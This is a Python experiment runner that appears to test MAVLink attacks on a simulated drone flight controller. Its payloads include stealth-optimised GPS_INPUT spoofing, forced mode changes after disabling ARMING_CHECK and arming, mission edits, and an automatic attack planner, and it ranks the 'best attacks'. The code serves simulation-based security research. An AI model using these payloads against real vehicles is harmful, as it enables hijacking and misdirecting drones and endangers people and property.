    experiment = "E12_stealth_optimizer"
    bundle_dir = create_bundle(config, experiment)
    objective, trace = choose_objective(config.objective, {"FENCE_ENABLE": 1.0})
    env = base_env(config, experiment, f"stealth-optimizer-{objective}", f"tcp:127.0.0.1:{config.port}")
    all_injection_rows: list[dict] = []
    all_telemetry_rows: list[dict] = []
    all_decision_rows: list[dict] = []
    rows: list[dict] = []
    case_envs: list[dict] = []
    metrics_by_profile: dict[str, dict] = {}
    verdict = {
        "experiment": experiment,
        "claim_tested": "stealth optimizer improves decision-impact trajectory cost",
        "verdict": "error",
        "reason": "E12 did not complete",
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    try:
        profiles = ("linear", "ekf-smooth", "adaptive", "stealth-opt")
        full_iterations = max(config.iterations, math.ceil(config.max_drift_m / max(config.step_m, 0.1)))
        opt_config = replace(config, iterations=full_iterations, objective=objective)
        for idx, profile in enumerate(profiles):
            env_case, inj, telem, decisions, metrics = run_decision_route_case(
                opt_config, bundle_dir, experiment, objective, profile.replace("-", "_"), profile, "fc-direct", idx > 0
            )
            case_envs.append(env_case)
            all_injection_rows.extend(inj)
            all_telemetry_rows.extend(telem)
            all_decision_rows.extend(decisions)
            metrics_by_profile[profile] = metrics
        linear = metrics_by_profile.get("linear", {})
        stealth = metrics_by_profile.get("stealth-opt", {})
        for profile, metrics in metrics_by_profile.items():
            improved = (
                profile == "stealth-opt"
                and bool(linear.get("decision_changed"))
                and bool(stealth.get("decision_changed"))
                and (
                as_float(stealth.get("stealth_score"), 9999.0) < as_float(linear.get("stealth_score"), 9999.0)
                )
            )
            rows.append(
                stealth_metric_row(
                    objective,
                    "fc-direct",
                    profile,
                    metrics,
                    "pass" if improved else "fail",
                    "stealth-opt improved over linear" if improved else "profile metrics captured",
                )
            )
        env["cases"] = case_envs
        env["params_before"] = case_envs[0].get("params_before", {}) if case_envs else {}
        env["params_after"] = case_envs[-1].get("params_after", {}) if case_envs else {}
        (bundle_dir / "params_before.txt").write_text(json.dumps(env["params_before"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text(json.dumps(env["params_after"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        write_csv(bundle_dir / "stealth_metrics.csv", STEALTH_METRICS_FIELDS, rows)
        write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, all_decision_rows)
        write_csv(bundle_dir / "planner_trace.csv", PLANNER_TRACE_FIELDS, trace)
        write_csv(bundle_dir / "mission_matrix.csv", MISSION_MATRIX_FIELDS, [])
        write_csv(bundle_dir / "route_score.csv", ROUTE_SCORE_FIELDS, [])
        write_csv(bundle_dir / "impact_matrix.csv", IMPACT_MATRIX_FIELDS, [])
        plan = attack_plan(objective, "fc-direct", "stealth-opt", config.max_drift_m, config.stealth_budget, trace)
        (bundle_dir / "attack_plan.json").write_text(json.dumps(plan, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        improved = any(row["profile"] == "stealth-opt" and row["verdict"] == "pass" for row in rows)
        verdict["metrics"] = {"objective": objective, "profiles": metrics_by_profile, "stealth_rows": rows}
        verdict["verdict"] = "pass" if improved else "fail"
        verdict["reason"] = "stealth-opt reduced stealth cost while preserving decision impact" if improved else "stealth-opt did not beat linear under measured constraints"
        (bundle_dir / "mission_summary.json").write_text(json.dumps(verdict, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        advanced_empty_files(bundle_dir)
        verdict["verdict"] = "error"
        verdict["reason"] = repr(exc)
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)


def route_score_row(route_key: str, objective: str, profile: str, metrics: dict, bundle: str = "") -> dict:
    passed = bool(metrics.get("decision_changed")) and as_float(metrics.get("reflection_rate")) >= 0.70
    return {
        "route": route_key,
        "objective": objective,
        "profile": profile,
        "verdict": "pass" if passed else metrics.get("verdict", "fail"),
        "reason": "GPS_INPUT reflected and selected decision changed" if passed else metrics.get("reason", "route did not produce decision impact"),
        "decision_changed": int(bool(metrics.get("decision_changed"))),
        "reflection_rate": metrics.get("reflection_rate", 0.0),
        "final_target_drift_m": metrics.get("final_target_drift_m", 0.0),
        "final_official_drift_m": metrics.get("final_official_drift_m", 0.0),
        "stealth_score": metrics.get("stealth_score", 0.0),
        "bundle": bundle,
    }


def run_e13(config: RunnerConfig) -> Path:
    experiment = "E13_route_relaxation"
    bundle_dir = create_bundle(config, experiment)
    objective, trace = choose_objective(config.objective, {"FENCE_ENABLE": 1.0})
    env = base_env(config, experiment, f"route-relaxation-{objective}", "<route-matrix>")
    all_injection_rows: list[dict] = []
    all_telemetry_rows: list[dict] = []
    all_decision_rows: list[dict] = []
    route_rows: list[dict] = []
    case_envs: list[dict] = []
    verdict = {
        "experiment": experiment,
        "claim_tested": "planner route relaxation beyond FC direct",
        "verdict": "error",
        "reason": "E13 did not complete",
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    try:
        full_iterations = max(config.iterations, math.ceil(config.max_drift_m / max(config.step_m, 0.1)))
        route_config = replace(config, iterations=full_iterations, objective=objective)
        for idx, route_key in enumerate(selected_routes(config.routes)):
            env_case, inj, telem, decisions, metrics = run_decision_route_case(
                route_config,
                bundle_dir,
                experiment,
                objective,
                f"{route_key}_stealth_opt",
                "stealth-opt",
                route_key,
                idx > 0,
            )
            case_envs.append(env_case)
            all_injection_rows.extend(inj)
            all_telemetry_rows.extend(telem)
            all_decision_rows.extend(decisions)
            route_rows.append(route_score_row(route_key, objective, "stealth-opt", metrics))
        env["cases"] = case_envs
        env["params_before"] = case_envs[0].get("params_before", {}) if case_envs else {}
        env["params_after"] = case_envs[-1].get("params_after", {}) if case_envs else {}
        (bundle_dir / "params_before.txt").write_text(json.dumps(env["params_before"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text(json.dumps(env["params_after"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        write_csv(bundle_dir / "route_score.csv", ROUTE_SCORE_FIELDS, route_rows)
        write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, all_decision_rows)
        write_csv(bundle_dir / "planner_trace.csv", PLANNER_TRACE_FIELDS, trace)
        write_csv(bundle_dir / "mission_matrix.csv", MISSION_MATRIX_FIELDS, [])
        write_csv(bundle_dir / "stealth_metrics.csv", STEALTH_METRICS_FIELDS, [])
        write_csv(bundle_dir / "impact_matrix.csv", IMPACT_MATRIX_FIELDS, [])
        plan = attack_plan(objective, "all", "stealth-opt", config.max_drift_m, config.stealth_budget, trace)
        (bundle_dir / "attack_plan.json").write_text(json.dumps(plan, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        direct_ok = any(row["route"] == "fc-direct" and row["verdict"] == "pass" for row in route_rows)
        relaxed = [row for row in route_rows if row["route"] != "fc-direct" and row["verdict"] == "pass"]
        verdict["metrics"] = {"objective": objective, "routes": route_rows}
        if direct_ok and relaxed:
            verdict["verdict"] = "pass"
            verdict["reason"] = "planner payload reproduced through direct and at least one non-direct route"
        elif direct_ok:
            verdict["verdict"] = "fail"
            verdict["reason"] = "payload works through direct route only"
        else:
            verdict["verdict"] = "fail"
            verdict["reason"] = "direct route did not produce selected decision impact"
        (bundle_dir / "mission_summary.json").write_text(json.dumps(verdict, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        advanced_empty_files(bundle_dir)
        verdict["verdict"] = "error"
        verdict["reason"] = repr(exc)
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)


def run_e14(config: RunnerConfig) -> Path:
    experiment = "E14_auto_attack_planner"
    bundle_dir = create_bundle(config, experiment)
    objective, trace = choose_objective("auto", {"FENCE_ENABLE": 1.0})
    plan = attack_plan(objective, "fc-direct", "stealth-opt", config.max_drift_m, config.stealth_budget, trace)
    env = base_env(config, experiment, "auto-attack-planner", f"tcp:127.0.0.1:{config.port}")
    all_injection_rows: list[dict] = []
    all_telemetry_rows: list[dict] = []
    all_decision_rows: list[dict] = []
    verdict = {
        "experiment": experiment,
        "claim_tested": "automatic objective selection and execution",
        "verdict": "error",
        "reason": "E14 did not complete",
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    try:
        env_case, inj, telem, decisions, metrics = run_decision_route_case(
            replace(
                config,
                objective=objective,
                profile="stealth-opt",
                iterations=max(config.iterations, math.ceil(config.max_drift_m / max(config.step_m, 0.1))),
            ),
            bundle_dir,
            experiment,
            objective,
            "auto_selected_stealth_opt",
            "stealth-opt",
            "fc-direct",
            False,
        )
        env["cases"] = [env_case]
        env["params_before"] = env_case.get("params_before", {})
        env["params_after"] = env_case.get("params_after", {})
        all_injection_rows.extend(inj)
        all_telemetry_rows.extend(telem)
        all_decision_rows.extend(decisions)
        (bundle_dir / "params_before.txt").write_text(json.dumps(env["params_before"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text(json.dumps(env["params_after"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        write_csv(bundle_dir / "planner_trace.csv", PLANNER_TRACE_FIELDS, trace)
        write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, all_decision_rows)
        write_csv(bundle_dir / "mission_matrix.csv", MISSION_MATRIX_FIELDS, [
            matrix_row(objective, "auto_selected_stealth_opt", "pass" if decisions else "fail", "planner selected and executed objective" if decisions else "selected objective did not trigger", metrics, detect_event(telem, objective))
        ])
        write_csv(bundle_dir / "stealth_metrics.csv", STEALTH_METRICS_FIELDS, [
            stealth_metric_row(objective, "fc-direct", "stealth-opt", metrics, "pass" if decisions else "fail", "planner-selected profile metrics")
        ])
        write_csv(bundle_dir / "route_score.csv", ROUTE_SCORE_FIELDS, [
            route_score_row("fc-direct", objective, "stealth-opt", metrics)
        ])
        write_csv(bundle_dir / "impact_matrix.csv", IMPACT_MATRIX_FIELDS, [])
        (bundle_dir / "attack_plan.json").write_text(json.dumps(plan, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        verdict["metrics"] = {"selected_objective": objective, "plan": plan, "execution": metrics}
        verdict["verdict"] = "pass" if decisions else "fail"
        verdict["reason"] = "auto planner selected objective from trace and produced decision event" if decisions else "auto planner selected objective but no decision event occurred"
        (bundle_dir / "mission_summary.json").write_text(json.dumps(verdict, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        advanced_empty_files(bundle_dir)
        verdict["verdict"] = "error"
        verdict["reason"] = repr(exc)
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)


def read_csv_rows(path: Path) -> list[dict]:
    if not path.exists():
        return []
    with path.open(encoding="utf-8", newline="") as f:
        return list(csv.DictReader(f))


def impact_row_from_matrix(row: dict, source: str) -> dict:
    return {
        "objective": row.get("objective", ""),
        "best_route": row.get("route", "fc-direct") or "fc-direct",
        "best_profile": row.get("profile", "stealth-opt") or "stealth-opt",
        "verdict": row.get("verdict", ""),
        "decision_changed": row.get("decision_changed", 0),
        "decision_time_s": row.get("decision_time_s", 0.0),
        "minimum_drift_m": row.get("minimum_drift_m", 0.0),
        "stealth_score": row.get("stealth_score", 0.0),
        "source_bundle": source,
    }


def run_e15(config: RunnerConfig) -> Path:
    experiment = "E15_mission_impact_full_run"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "mission-impact-full-run-summary", "<summary>")
    (bundle_dir / "sitl.log").write_text("E15 summarizes latest E11-E14 bundles; it does not launch SITL.\n", encoding="utf-8")
    (bundle_dir / "params_before.txt").write_text("not applicable\n", encoding="utf-8")
    (bundle_dir / "params_after.txt").write_text("not applicable\n", encoding="utf-8")
    refs = {
        "E11": latest_bundle(config.out_root, "E11_mission_decision_matrix"),
        "E12": latest_bundle(config.out_root, "E12_stealth_optimizer"),
        "E13": latest_bundle(config.out_root, "E13_route_relaxation"),
        "E14": latest_bundle(config.out_root, "E14_auto_attack_planner"),
    }
    impact_rows: list[dict] = []
    for key, path in refs.items():
        if not path:
            continue
        for row in read_csv_rows(path / "mission_matrix.csv"):
            if row.get("case") != "baseline":
                impact_rows.append(impact_row_from_matrix(row, str(path)))
        for row in read_csv_rows(path / "route_score.csv"):
            if row.get("verdict") == "pass":
                impact_rows.append({
                    "objective": row.get("objective", ""),
                    "best_route": row.get("route", ""),
                    "best_profile": row.get("profile", ""),
                    "verdict": row.get("verdict", ""),
                    "decision_changed": row.get("decision_changed", 0),
                    "decision_time_s": 0.0,
                    "minimum_drift_m": row.get("final_target_drift_m", 0.0),
                    "stealth_score": row.get("stealth_score", 0.0),
                    "source_bundle": str(path),
                })
    best_rows = [row for row in impact_rows if row.get("verdict") == "pass"]
    failed_rows = [row for row in impact_rows if row.get("verdict") != "pass"]
    write_csv(bundle_dir / "impact_matrix.csv", IMPACT_MATRIX_FIELDS, impact_rows)
    write_csv(bundle_dir / "best_attacks.csv", IMPACT_MATRIX_FIELDS, best_rows)
    write_csv(bundle_dir / "failed_targets.csv", IMPACT_MATRIX_FIELDS, failed_rows)
    write_csv(bundle_dir / "mission_matrix.csv", MISSION_MATRIX_FIELDS, [])
    write_csv(bundle_dir / "stealth_metrics.csv", STEALTH_METRICS_FIELDS, [])
    write_csv(bundle_dir / "planner_trace.csv", PLANNER_TRACE_FIELDS, [])
    write_csv(bundle_dir / "route_score.csv", ROUTE_SCORE_FIELDS, [])
    write_csv(bundle_dir / "controller.csv", CONTROLLER_FIELDS, [])
    write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, [])
    (bundle_dir / "attack_plan.json").write_text("{}\n", encoding="utf-8")
    non_geofence = [row for row in best_rows if row.get("objective") != "geofence"]
    verdict = {
        "experiment": experiment,
        "claim_tested": "full mission-impact matrix synthesis",
        "verdict": "pass" if non_geofence else "fail",
        "reason": "full matrix includes non-geofence successful impact" if non_geofence else "full matrix remains geofence-only or failed",
        "metrics": {"source_bundles": {k: str(v) if v else None for k, v in refs.items()}, "best_attacks": best_rows},
        "not_claimed": NOT_CLAIMED,
    }
    (bundle_dir / "mission_summary.json").write_text(json.dumps(verdict, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return write_bundle(bundle_dir, experiment, env, [], [], verdict)


def classify_claim(config: RunnerConfig) -> tuple[str, dict]:
    e15 = latest_bundle(config.out_root, "E15_mission_impact_full_run")
    e13 = latest_bundle(config.out_root, "E13_route_relaxation")
    best = read_csv_rows(e15 / "best_attacks.csv") if e15 else []
    route_rows = read_csv_rows(e13 / "route_score.csv") if e13 else []
    geofence = any(row.get("objective") == "geofence" and row.get("verdict") == "pass" for row in best)
    non_geofence = any(row.get("objective") != "geofence" and row.get("verdict") == "pass" for row in best)
    route_flexible = any(row.get("route") != "fc-direct" and row.get("verdict") == "pass" for row in route_rows)
    if non_geofence and route_flexible:
        claim = "route-flexible post-access mission-deception payload"
    elif non_geofence:
        claim = "adaptive mission-deception payload"
    elif geofence:
        claim = "adaptive geofence-deception payload"
    else:
        claim = "post-access navigation-deception payload"
    return claim, {
        "geofence_success": geofence,
        "non_geofence_success": non_geofence,
        "route_flexible_success": route_flexible,
        "latest_E15": str(e15) if e15 else None,
        "latest_E13": str(e13) if e13 else None,
    }


def run_e16(config: RunnerConfig) -> Path:
    experiment = "E16_claim_classifier"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "claim-classifier", "<summary>")
    (bundle_dir / "sitl.log").write_text("E16 classifies latest E11-E15 results; it does not launch SITL.\n", encoding="utf-8")
    (bundle_dir / "params_before.txt").write_text("not applicable\n", encoding="utf-8")
    (bundle_dir / "params_after.txt").write_text("not applicable\n", encoding="utf-8")
    claim, metrics = classify_claim(config)
    verdict = {
        "experiment": experiment,
        "claim_tested": "automatic result-bounded claim classification",
        "verdict": "pass" if claim != "post-access navigation-deception payload" else "fail",
        "reason": claim,
        "metrics": metrics,
        "not_claimed": NOT_CLAIMED,
    }
    advanced_empty_files(bundle_dir)
    (bundle_dir / "mission_summary.json").write_text(json.dumps({"classification": claim, "verdict": verdict}, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return write_bundle(bundle_dir, experiment, env, [], [], verdict)


def run_e17(config: RunnerConfig) -> Path:
    experiment = "E17_final_summary"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "real-advanced-final-summary", "<summary>")
    (bundle_dir / "sitl.log").write_text("E17 summarizes latest E11-E16 results; it does not launch SITL.\n", encoding="utf-8")
    (bundle_dir / "params_before.txt").write_text("not applicable\n", encoding="utf-8")
    (bundle_dir / "params_after.txt").write_text("not applicable\n", encoding="utf-8")
    refs = {
        "E11": latest_bundle(config.out_root, "E11_mission_decision_matrix"),
        "E12": latest_bundle(config.out_root, "E12_stealth_optimizer"),
        "E13": latest_bundle(config.out_root, "E13_route_relaxation"),
        "E14": latest_bundle(config.out_root, "E14_auto_attack_planner"),
        "E15": latest_bundle(config.out_root, "E15_mission_impact_full_run"),
        "E16": latest_bundle(config.out_root, "E16_claim_classifier"),
    }
    claim, metrics = classify_claim(config)
    source_verdicts = {}
    for key, path in refs.items():
        if path and (path / "verdict.json").exists():
            source_verdicts[key] = json.loads((path / "verdict.json").read_text(encoding="utf-8"))
        else:
            source_verdicts[key] = {"verdict": "missing", "reason": "no bundle found"}
    verdict = {
        "experiment": experiment,
        "claim_tested": "final real-advanced B-path summary",
        "verdict": "pass" if metrics.get("non_geofence_success") and metrics.get("route_flexible_success") else "fail",
        "reason": claim,
        "metrics": {"classification_metrics": metrics, "source_verdicts": source_verdicts},
        "not_claimed": NOT_CLAIMED,
    }
    advanced_empty_files(bundle_dir)
    summary = {
        "classification": claim,
        "source_bundles": {k: str(v) if v else None for k, v in refs.items()},
        "verdict": verdict,
    }
    (bundle_dir / "mission_summary.json").write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return write_bundle(bundle_dir, experiment, env, [], [], verdict)


def payload_empty_files(bundle_dir: Path) -> None:
    write_csv(bundle_dir / "payload_matrix.csv", PAYLOAD_MATRIX_FIELDS, [])
    write_csv(bundle_dir / "mission_impact_matrix.csv", MISSION_IMPACT_MATRIX_FIELDS, [])
    write_csv(bundle_dir / "precondition_matrix.csv", PRECONDITION_MATRIX_FIELDS, [])
    (bundle_dir / "attack_surface_summary.json").write_text("{}\n", encoding="utf-8")


def payload_matrix_row(
    experiment: str,
    payload: str,
    route: str,
    variant: str,
    verdict: str,
    reason: str,
    effect: str,
    preconditions: str,
    mission_impact: str,
    fc_impact: bool,
    gcs_or_log_impact: bool,
    observed_signal: str,
    bundle: str = "",
) -> dict:
    return {
        "timestamp": utc_now(),
        "experiment": experiment,
        "payload": payload,
        "route": route,
        "variant": variant,
        "verdict": verdict,
        "reason": reason,
        "effect": effect,
        "preconditions": preconditions,
        "mission_impact": mission_impact,
        "fc_impact": int(fc_impact),
        "gcs_or_log_impact": int(gcs_or_log_impact),
        "observed_signal": observed_signal,
        "bundle": bundle,
    }


def mission_impact_row(
    payload: str,
    route: str,
    variant: str,
    impact_type: str,
    confirmed: bool,
    decision_signal: str = "",
    mode: str = "",
    mission_seq: str | int = "",
    parameter: str = "",
    before: str | float | None = "",
    after: str | float | None = "",
    notes: str = "",
) -> dict:
    return {
        "payload": payload,
        "route": route,
        "variant": variant,
        "impact_type": impact_type,
        "impact_confirmed": int(confirmed),
        "decision_signal": decision_signal,
        "mode": mode,
        "mission_seq": mission_seq,
        "parameter": parameter,
        "before": "" if before is None else before,
        "after": "" if after is None else after,
        "notes": notes,
    }


def precondition_row(
    payload: str,
    route: str,
    required_access: str,
    required_state: str,
    required_params: str,
    blocked_reason: str = "",
) -> dict:
    return {
        "payload": payload,
        "route": route,
        "required_access": required_access,
        "required_state": required_state,
        "required_params": required_params,
        "blocked_reason": blocked_reason,
        "not_claimed": "; ".join(NOT_CLAIMED),
    }


def payloads_to_run(value: str) -> tuple[str, ...]:
    payloads = (
        "gps-input",
        "mode-command",
        "mission-edit",
        "param-edit",
        "telemetry-deception",
    )
    if value == "all":
        return payloads
    if value not in payloads:
        raise ValueError(f"unknown payload: {value}")
    return (value,)


def mode_seen(rows: list[dict], mode: str) -> bool:
    mode_upper = mode.upper()
    return any(
        row.get("message_type") == "HEARTBEAT"
        and str(row.get("mode", "")).upper() == mode_upper
        for row in rows
    )


def mission_readback_count(conn, timeout: float = 6.0) -> int:
    try:
        mission_request_list(conn)
    except Exception:
        return 0
    count = 0
    received_items: set[int] = set()
    deadline = time.time() + timeout
    while time.time() < deadline:
        msg = conn.recv_match(type=["MISSION_COUNT", "MISSION_ITEM", "MISSION_ITEM_INT"], blocking=True, timeout=0.4)
        if msg is None:
            continue
        if msg.get_type() == "MISSION_COUNT":
            count = int(getattr(msg, "count", 0))
            for seq in range(count):
                try:
                    mission_request_item(conn, seq)
                except Exception:
                    pass
        elif msg.get_type() in ("MISSION_ITEM", "MISSION_ITEM_INT"):
            received_items.add(int(getattr(msg, "seq", 0)))
            count = max(count, len(received_items), int(getattr(msg, "seq", 0)) + 1)
            if len(received_items) >= 2:
                return len(received_items)
    return max(count, len(received_items))


def changed_target(before: float | None, preferred: float, alternate: float) -> float:
    if before is not None and abs(float(before) - float(preferred)) < 0.2:
        return alternate
    return preferred


def first_existing_param(conn, candidates: Iterable[tuple[str, float, float]]) -> tuple[str, float, float | None] | None:
    for name, preferred, alternate in candidates:
        before = request_param(conn, name)
        if before is not None:
            return name, changed_target(before, preferred, alternate), before
    return None


def write_payload_bundle(
    bundle_dir: Path,
    rows: list[dict],
    impact_rows: list[dict],
    precondition_rows: list[dict],
    summary: dict,
) -> None:
    write_csv(bundle_dir / "payload_matrix.csv", PAYLOAD_MATRIX_FIELDS, rows)
    write_csv(bundle_dir / "mission_impact_matrix.csv", MISSION_IMPACT_MATRIX_FIELDS, impact_rows)
    write_csv(bundle_dir / "precondition_matrix.csv", PRECONDITION_MATRIX_FIELDS, precondition_rows)
    (bundle_dir / "attack_surface_summary.json").write_text(
        json.dumps(summary, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )


def run_mode_command_case(
    config: RunnerConfig,
    bundle_dir: Path,
    experiment: str,
    mode: str,
    route_key: str,
    append_log: bool,
) -> tuple[dict, list[dict], list[dict], dict]:
    connection, use_mavproxy, route = route_connection(route_key, config)
    processes: list[ManagedProcess] = []
    conn = None
    telemetry_rows: list[dict] = []
    env_case: dict = {"mode": mode, "route": route_key, "connection": connection}
    metrics = {"mode": mode, "route": route_key, "changed": False, "reason": "not run"}
    try:
        sitl, sitl_command = start_sitl(config, bundle_dir, append_log=append_log)
        processes.append(sitl)
        env_case["sitl_launch_command"] = sitl_command
        if use_mavproxy:
            mavproxy, mavproxy_command, mavproxy_error = start_mavproxy(config, bundle_dir)
            env_case["mavproxy_command"] = mavproxy_command
            env_case["mavproxy_error"] = mavproxy_error
            if mavproxy_error:
                metrics.update({"verdict": "blocked", "reason": mavproxy_error})
                return env_case, [], telemetry_rows, metrics
            if mavproxy is not None:
                processes.append(mavproxy)
        conn = connect_mavlink(connection)
        request_message_intervals(conn)
        lat, lon, alt, _heading = parse_home(config.home)
        env_case["params_before"] = snapshot_params(conn, bundle_dir / f"params_before_{experiment}_{route_key}_{mode}.txt")
        state = empty_state()
        start = time.time()
        telemetry_rows.extend(warmup_gps(conn, config, experiment, f"{mode}_warmup", lat, lon, alt, route, start, state))
        env_case["arming_check_disabled"] = set_param(conn, "ARMING_CHECK", 0)
        env_case["guided_mode"] = set_mode(conn, "GUIDED")
        env_case["armed"] = arm_vehicle(conn)
        changed = set_mode(conn, mode)
        telemetry_rows.extend(
            collect_telemetry(conn, experiment, f"{mode}_command", 0, None, lat, lon, start, 3.0, state)
        )
        observed = changed or mode_seen(telemetry_rows, mode)
        env_case["params_after"] = snapshot_params(conn, bundle_dir / f"params_after_{experiment}_{route_key}_{mode}.txt")
        metrics.update(
            {
                "verdict": "pass" if observed else "fail",
                "changed": observed,
                "reason": f"HEARTBEAT mode changed to {mode}" if observed else f"{mode} mode was not observed",
                "observed_signal": f"HEARTBEAT.mode={mode}" if observed else "no mode heartbeat",
            }
        )
        return env_case, [], telemetry_rows, metrics
    except Exception as exc:
        metrics.update({"verdict": "blocked", "reason": repr(exc)})
        return env_case, [], telemetry_rows, metrics
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        for proc in reversed(processes):
            proc.stop()
        time.sleep(1.0)


def run_e19(config: RunnerConfig) -> Path:
    experiment = "E19_mode_command"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "mode-command-matrix", "<routes>")
    all_telemetry_rows: list[dict] = []
    rows: list[dict] = []
    impact_rows: list[dict] = []
    pre_rows: list[dict] = []
    case_envs: list[dict] = []
    modes = ("RTL", "LAND", "BRAKE", "LOITER")
    try:
        for route_idx, route_key in enumerate(selected_routes(config.routes)):
            for mode_idx, mode in enumerate(modes):
                env_case, inj, telem, metrics = run_mode_command_case(
                    replace(config, warmup_sec=min(config.warmup_sec, 4.0)),
                    bundle_dir,
                    experiment,
                    mode,
                    route_key,
                    append_log=bool(route_idx or mode_idx),
                )
                case_envs.append(env_case)
                all_telemetry_rows.extend(telem)
                verdict_state = str(metrics.get("verdict", "fail"))
                rows.append(
                    payload_matrix_row(
                        experiment,
                        "mode-command",
                        route_key,
                        mode,
                        verdict_state,
                        str(metrics.get("reason", "")),
                        "direct flight-mode control",
                        "MAVLink write access; mode accepted by vehicle",
                        "immediate mode change" if verdict_state == "pass" else "no confirmed mode change",
                        verdict_state == "pass",
                        False,
                        str(metrics.get("observed_signal", "")),
                    )
                )
                impact_rows.append(
                    mission_impact_row(
                        "mode-command",
                        route_key,
                        mode,
                        "mode-change",
                        verdict_state == "pass",
                        str(metrics.get("observed_signal", "")),
                        mode if verdict_state == "pass" else "",
                        notes=str(metrics.get("reason", "")),
                    )
                )
                pre_rows.append(
                    precondition_row(
                        "mode-command",
                        route_key,
                        "MAVLink write access to FC command/mode channel",
                        "vehicle accepts requested mode; some modes need GPS/home/armed state",
                        "ARMING_CHECK may need relaxation in SITL",
                        "" if verdict_state != "blocked" else str(metrics.get("reason", "")),
                    )
                )
        env["cases"] = case_envs
        env["params_before"] = case_envs[0].get("params_before", {}) if case_envs else {}
        env["params_after"] = case_envs[-1].get("params_after", {}) if case_envs else {}
        (bundle_dir / "params_before.txt").write_text(json.dumps(env["params_before"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text(json.dumps(env["params_after"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        passed = [row for row in rows if row["verdict"] == "pass"]
        verdict = {
            "experiment": experiment,
            "claim_tested": "MAVLink mode-command payload matrix",
            "verdict": "pass" if passed else "fail",
            "reason": f"{len(passed)} mode command cells changed mode" if passed else "no mode command changed mode",
            "metrics": {"rows": rows},
            "not_claimed": NOT_CLAIMED,
        }
        summary = {"payload": "mode-command", "passed_cells": len(passed), "rows": rows}
        write_payload_bundle(bundle_dir, rows, impact_rows, pre_rows, summary)
        return write_bundle(bundle_dir, experiment, env, [], all_telemetry_rows, verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        payload_empty_files(bundle_dir)
        verdict = {
            "experiment": experiment,
            "claim_tested": "MAVLink mode-command payload matrix",
            "verdict": "error",
            "reason": repr(exc),
            "metrics": {},
            "not_claimed": NOT_CLAIMED,
        }
        return write_bundle(bundle_dir, experiment, env, [], all_telemetry_rows, verdict)


def run_e20(config: RunnerConfig) -> Path:
    experiment = "E20_mission_edit"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "mission-edit", f"tcp:127.0.0.1:{config.port}")
    processes: list[ManagedProcess] = []
    conn = None
    telemetry_rows: list[dict] = []
    rows: list[dict] = []
    impact_rows: list[dict] = []
    pre_rows: list[dict] = []
    try:
        sitl, sitl_command = start_sitl(config, bundle_dir)
        processes.append(sitl)
        env["sitl_launch_command"] = sitl_command
        conn = connect_mavlink(f"tcp:127.0.0.1:{config.port}")
        request_message_intervals(conn)
        lat, lon, alt, _heading = parse_home(config.home)
        env["params_before"] = snapshot_params(conn, bundle_dir / "params_before.txt")
        state = empty_state()
        start = time.time()
        telemetry_rows.extend(warmup_gps(conn, config, experiment, "warmup", lat, lon, alt, "fc-direct-mission-edit", start, state))
        uploaded = upload_single_waypoint_mission(conn, lat, lon, alt, bearing_deg=config.bearing_deg)
        readback_count = mission_readback_count(conn)
        env["mission_uploaded"] = uploaded
        env["mission_readback_count"] = readback_count
